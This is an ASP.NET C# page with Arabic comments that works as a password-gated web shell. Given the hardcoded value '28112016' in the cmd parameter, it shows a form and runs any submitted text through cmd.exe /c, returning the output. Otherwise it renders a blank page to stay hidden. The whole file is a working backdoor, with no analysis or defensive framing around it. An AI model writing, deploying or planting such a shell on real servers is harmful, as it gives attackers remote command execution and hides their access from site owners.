<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // تحقق إذا تم تمرير المتغير cmd في URL
        if (Request["cmd"] != null)
        {
            string command = Request["cmd"];
            
            // تحقق من أن كلمة المرور هي "28112016"
            if (command == "28112016")
            {
                // إذا كانت كلمة المرور صحيحة، اعرض النموذج لإدخال الأمر
                Response.Write(@"
                    <form method='get'>
                        Command: <input type='text' name='execute' />
                        <input type='hidden' name='cmd' value='28112016' />
                        <input type='submit' value='Execute' />
                    </form>
                ");

                // إذا تم إدخال أمر، قم بتنفيذه
                string cmdCommand = Request["execute"];
                if (!string.IsNullOrEmpty(cmdCommand))
                {
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + cmdCommand;
                    psi.RedirectStandardOutput = true;
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;

                    Process process = Process.Start(psi);
                    string output = process.StandardOutput.ReadToEnd();
                    Response.Write("<pre>" + output + "</pre>");
                }
            }
            else
            {
                // إذا كانت كلمة المرور غير صحيحة، لا تعرض أي شيء
                Response.Clear();
            }
        }
        else
        {
            // إذا لم يتم إدخال كلمة المرور، لا تعرض أي شيء (الصفحة تظل بيضاء)
            Response.Clear();
        }
    }
</script>

<html>
<body>
    <!-- لا شيء يظهر هنا عند فتح الصفحة لأول مرة -->
</body>
</html>
